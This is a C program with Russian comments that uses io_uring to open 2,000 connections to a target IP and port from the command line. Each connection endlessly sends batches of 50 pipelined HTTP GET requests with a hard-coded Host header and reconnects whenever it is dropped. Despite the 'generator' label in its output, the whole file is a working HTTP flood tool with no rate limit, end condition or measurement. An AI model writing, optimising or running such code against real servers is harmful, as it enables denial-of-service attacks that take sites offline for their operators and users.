#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <liburing.h>

// Конфигурация
#define RING_ENTRIES 8192
#define CONNS_PER_THREAD 1000
#define NUM_THREADS 2
#define RESP_SIZE 8192       // Увеличен буфер чтения (чтобы TCP окно не забилось)
#define PIPELINE_DEPTH 50    // Отправляем 50 запросов за один вызов!

const char *base_http_req = 
    "GET / HTTP/1.1\r\n"
    "Host: dstats.cc\r\n"
    "Connection: keep-alive\r\n"
    "Accept: */*\r\n\r\n";

char *pipelined_req;
int req_len;

enum {
    STATE_CONNECT,
    STATE_SEND,
    STATE_RECV
};

struct connection {
    int fd;
    int state;
    char recv_buf[RESP_SIZE];
};

struct thread_data {
    int thread_id;
    struct io_uring ring;
    struct connection conns[CONNS_PER_THREAD];
    struct sockaddr_in target_addr;
};

void pin_thread_to_core(int core_id) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core_id, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
}

int setup_socket() {
    int fd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, IPPROTO_TCP);
    if (fd < 0) return -1;
    
    int flag = 1;
    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(flag));
    return fd;
}

void add_connect(struct io_uring *ring, struct connection *conn, struct sockaddr_in *addr) {
    struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
    io_uring_prep_connect(sqe, conn->fd, (struct sockaddr *)addr, sizeof(*addr));
    conn->state = STATE_CONNECT;
    io_uring_sqe_set_data(sqe, conn);
}

void add_send(struct io_uring *ring, struct connection *conn) {
    struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
    // MSG_NOSIGNAL обязателен, иначе прога упадет при закрытии сокета сервером
    io_uring_prep_send(sqe, conn->fd, pipelined_req, req_len, MSG_NOSIGNAL);
    conn->state = STATE_SEND;
    io_uring_sqe_set_data(sqe, conn);
}

void add_recv(struct io_uring *ring, struct connection *conn) {
    struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
    io_uring_prep_recv(sqe, conn->fd, conn->recv_buf, RESP_SIZE, 0);
    conn->state = STATE_RECV;
    io_uring_sqe_set_data(sqe, conn);
}

// Подготавливаем мега-буфер из 50 склеенных запросов
void build_pipelined_req() {
    int base_len = strlen(base_http_req);
    req_len = base_len * PIPELINE_DEPTH;
    pipelined_req = malloc(req_len + 1);
    pipelined_req[0] = '\0';
    for (int i = 0; i < PIPELINE_DEPTH; i++) {
        strcat(pipelined_req, base_http_req);
    }
}

void *worker_thread(void *arg) {
    struct thread_data *td = (struct thread_data *)arg;
    pin_thread_to_core(td->thread_id);

    struct io_uring_params params;
    memset(&params, 0, sizeof(params));
    // Убрали SQPOLL! Для 2 ядер стандартный submit работает гораздо стабильнее
    params.flags = IORING_SETUP_CQSIZE;
    params.cq_entries = RING_ENTRIES * 2;

    if (io_uring_queue_init_params(RING_ENTRIES, &td->ring, &params) < 0) {
        perror("io_uring_queue_init_params");
        return NULL;
    }

    for (int i = 0; i < CONNS_PER_THREAD; i++) {
        td->conns[i].fd = setup_socket();
        add_connect(&td->ring, &td->conns[i], &td->target_addr);
    }
    
    io_uring_submit(&td->ring);

    while (1) {
        struct io_uring_cqe *cqe;
        unsigned head;
        int count = 0;

        // БЛОКИРУЕМСЯ, пока ядро не вернет хотя бы 1 ответ. 
        // Это спасает CPU от 100% нагрузки в холостом цикле.
        io_uring_submit_and_wait(&td->ring, 1);

        io_uring_for_each_cqe(&td->ring, head, cqe) {
            struct connection *conn = (struct connection *)io_uring_cqe_get_data(cqe);
            int res = cqe->res;
            
            if (res < 0 && res != -EINPROGRESS && res != -EAGAIN) {
                // Переподключение при разрыве
                close(conn->fd);
                conn->fd = setup_socket();
                add_connect(&td->ring, conn, &td->target_addr);
            } else {
                if (conn->state == STATE_CONNECT) {
                    add_send(&td->ring, conn);
                } else if (conn->state == STATE_SEND) {
                    add_recv(&td->ring, conn); // Дренируем ответы
                } else if (conn->state == STATE_RECV) {
                    add_send(&td->ring, conn); // Снова лупим 50 запросов
                }
            }
            count++;
        }
        
        io_uring_cq_advance(&td->ring, count);
    }

    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <IP> <PORT>\n", argv[0]);
        return 1;
    }

    build_pipelined_req();
    pthread_t threads[NUM_THREADS];
    struct thread_data td[NUM_THREADS];

    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(atoi(argv[2]));
    inet_pton(AF_INET, argv[1], &target.sin_addr);

    printf("[ENI] Запускаю генератор. 2 Ядра, %d коннектов, %d запросов/пакет...\n", 
            NUM_THREADS * CONNS_PER_THREAD, PIPELINE_DEPTH);

    for (int i = 0; i < NUM_THREADS; i++) {
        td[i].thread_id = i;
        td[i].target_addr = target;
        pthread_create(&threads[i], NULL, worker_thread, &td[i]);
    }

    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}
